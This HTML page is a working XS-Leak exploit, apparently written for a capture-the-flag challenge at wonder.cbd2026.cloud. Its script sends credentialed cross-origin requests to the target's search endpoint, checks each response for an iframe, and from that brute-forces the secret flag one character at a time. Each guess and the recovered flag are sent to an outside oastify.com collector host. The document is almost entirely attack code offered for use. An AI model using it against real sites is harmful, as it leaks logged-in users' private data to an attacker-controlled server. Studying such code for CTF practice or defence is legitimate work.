<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>XS-Leak Exploit</title>
</head>
<body>
    <h1>Exploiting...</h1>
    <pre id="log"></pre>

    <script>
        const log = document.getElementById('log');
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!@#$%^&*.,:";
        const TARGET_URL = "https://wonder.cbd2026.cloud";
        const LEAK_URL = "https://ezh3bs1kb0ocwzzprkrgw175awgn4nsc.oastify.com";
        
        let flag = "";
        
        function logMsg(msg) {
            log.textContent += msg + "\n";
        }

        // Debug: Send START signal immediately
        fetch(`${LEAK_URL}?f=START&t=${Date.now()}`)
            .then(() => logMsg("START signal sent"))
            .catch(e => logMsg("START failed: " + e));

        async function test(query) {
            const url = `${TARGET_URL}/search?q=${encodeURIComponent(query)}`;
            
            // Error-based XS-Leak: Try to fetch the search page and check response
            // If there's a match, the page will have an iframe which we can detect
            // by checking if we can access it or if it causes different behavior
            
            try {
                const response = await fetch(url, {
                    mode: 'cors',
                    credentials: 'include'
                });
                
                const text = await response.text();
                
                // Check if the response contains an iframe
                const hasIframe = text.includes('<iframe');
                
                logMsg(`Test "${query}": hasIframe=${hasIframe}`);
                fetch(`${LEAK_URL}?f=TEST:${query}:${hasIframe}`)
                    .catch(e => {});
                
                return hasIframe;
            } catch (e) {
                // CORS blocked - try another approach
                logMsg(`CORS blocked for "${query}", trying image load technique`);
                
                // Image load technique: Try to load the search page as an image
                // If it has iframe, it might load differently
                return new Promise((resolve) => {
                    const img = new Image();
                    let loaded = false;
                    
                    img.onload = () => {
                        loaded = true;
                        logMsg(`Image loaded for "${query}"`);
                        fetch(`${LEAK_URL}?f=IMG:${query}:loaded`)
                            .catch(e => {});
                        resolve(true);
                    };
                    
                    img.onerror = () => {
                        logMsg(`Image error for "${query}"`);
                        fetch(`${LEAK_URL}?f=IMG:${query}:error`)
                            .catch(e => {});
                        resolve(false);
                    };
                    
                    img.src = url + "&t=" + Date.now();
                    
                    // Timeout
                    setTimeout(() => {
                        if (!loaded) {
                            logMsg(`Image timeout for "${query}"`);
                            fetch(`${LEAK_URL}?f=IMG:${query}:timeout`)
                                .catch(e => {});
                            resolve(false);
                        }
                    }, 3000);
                });
            }
        }

        async function findPrefix() {
            const prefixes = ["CBD{", "FLAG{", "CTF{", "wonder{", "Wonder{", "WONDER{", "flag{", "cbd{"];
            
            logMsg("Finding correct prefix...");
            
            for (const prefix of prefixes) {
                logMsg(`Testing prefix: ${prefix}`);
                
                const isMatch = await test(prefix);
                
                // Send result to server
                fetch(`${LEAK_URL}?f=PREFIX:${prefix}:${isMatch}`)
                    .catch(e => logMsg("Failed to send: " + e));
                
                if (isMatch) {
                    logMsg(`✓ Found prefix: ${prefix}`);
                    return prefix;
                }
                
                await new Promise(r => setTimeout(r, 200));
            }
            
            logMsg("No prefix found, trying empty search...");
            return "";
        }

        async function leakFlag() {
            // First, find the correct prefix
            flag = await findPrefix();
            
            if (flag === "") {
                logMsg("Trying brute force from scratch...");
                // Start with empty and build up
                flag = "";
            }
            
            logMsg("Starting XS-Leak attack...");
            logMsg("Current flag: " + flag);
            
            while (true) {
                let found = false;
                
                for (const c of chars) {
                    const testFlag = flag + c;
                    logMsg(`Testing: ${testFlag}`);
                    
                    const isMatch = await test(testFlag);
                    
                    if (isMatch) {
                        flag = testFlag;
                        logMsg(`✓ Found character: ${c}`);
                        logMsg(`Current flag: ${flag}`);
                        
                        // Send to our server
                        fetch(`${LEAK_URL}?f=${encodeURIComponent(flag)}`)
                            .catch(e => logMsg("Failed to send to server: " + e));
                        
                        found = true;
                        break;
                    }
                    
                    // Small delay to avoid rate limiting
                    await new Promise(r => setTimeout(r, 200));
                }
                
                if (!found) {
                    logMsg("No more characters found!");
                    logMsg("Final flag: " + flag);
                    
                    // Send final result
                    fetch(`${LEAK_URL}?f=${encodeURIComponent(flag)}&done=1`)
                        .catch(e => logMsg("Failed to send final result: " + e));
                    
                    break;
                }
            }
        }

        // Start the exploit
        leakFlag().catch(e => logMsg("Error: " + e));
    </script>
</body>
</html>
